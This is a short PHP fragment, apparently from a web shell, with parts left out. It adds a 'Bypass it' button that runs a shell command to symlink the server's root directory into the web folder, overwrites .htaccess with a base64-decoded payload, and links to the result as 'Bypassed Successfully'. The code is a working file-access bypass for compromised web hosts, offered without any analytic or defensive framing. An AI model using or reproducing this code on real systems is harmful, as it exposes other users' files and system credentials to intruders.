...
echo "<center><input type='submit' value='Bypass it' name='execer'></center>"; 
if (isset($_POST['execer'])){ exec('ln -s / root-exec.txt'); 
...
$file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $execer = symlink("/","root-exec.txt"); 
$rt="<br><a href=root-exec.txt TARGET='_blank'><font color=#00bb00 size=2 face='Courier New'><b>Bypassed Successfully</b></font></a>"; 
